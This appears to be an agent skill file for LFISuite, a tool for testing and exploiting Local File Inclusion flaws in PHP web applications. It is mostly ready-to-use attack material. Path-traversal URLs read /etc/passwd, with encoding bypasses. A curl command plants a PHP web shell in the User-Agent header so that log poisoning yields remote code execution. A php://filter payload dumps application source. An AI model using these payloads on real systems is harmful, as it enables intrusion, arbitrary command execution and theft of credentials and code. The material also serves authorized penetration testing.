---
name: lfisuite
description: "Automated Local File Inclusion testing and exploitation tool with path traversal and log poisoning. Use when testing and exploiting LFI vulnerabilities to achieve RCE via log poisoning or /proc inclusion."
license: MIT
compatibility: "Python 3; Linux/macOS; github.com/D35m0nd142/LFISuite"
metadata:
  author: AeonDave
  version: "1.0"
---

# LFISuite

Automated LFI tester and exploiter — path traversal, log poisoning, RCE.

## Quick Start

```bash
git clone https://github.com/D35m0nd142/LFISuite
cd LFISuite && python3 lfisuite.py

# Or run directly (interactive)
python3 lfisuite.py
```

## Interactive Menu Options

| Option | Purpose |
|--------|---------|
| 1 | Auto exploit (all techniques) |
| 2 | /etc/passwd inclusion |
| 3 | Log poisoning (Apache/Nginx) |
| 4 | /proc/self/environ |
| 5 | PHP wrapper (expect://) |
| 6 | PHP wrapper (php://filter) |
| 7 | PHP wrapper (php://input) |
| 8 | Remote file inclusion (RFI) |

## Common Workflows

**Confirm LFI manually first:**
```
http://target.com/page.php?file=../../../../etc/passwd
http://target.com/page.php?file=....//....//etc/passwd
http://target.com/page.php?file=%2fetc%2fpasswd
```

**Log poisoning to RCE:**
1. Inject PHP into User-Agent header via curl:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```
2. Include log file via LFI → execute `cmd=id`

**PHP filter to read source:**
```
?file=php://filter/convert.base64-encode/resource=index.php
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Wrapper techniques and filter bypass |
